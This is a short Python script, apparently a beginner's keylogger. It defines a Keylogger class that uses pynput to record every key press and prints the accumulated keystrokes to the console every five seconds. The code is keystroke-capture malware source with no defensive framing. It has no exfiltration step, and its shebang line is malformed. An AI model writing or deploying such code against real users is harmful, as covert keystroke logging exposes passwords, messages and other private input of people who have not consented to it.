#!/usr/binenv python
import pynput
from threading import Timer
log = ""

class Keylogger:
    def process_key_process(self, key):
        global log
        try:
            log = log + " " + str(key.char)
        except AttributeError:
            if key==key.space:
                log = log + " "
            else:
                log = log + " " + str(key)
        print(log)
    
    def report(self):
        global log
        print(log)
        log = ""
        Timer_time_func = Timer(5, self.report)
        Timer_time_func.start()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.process_key_process) as keyboard_listener:
            self.report()
            keyboard_listener.join()


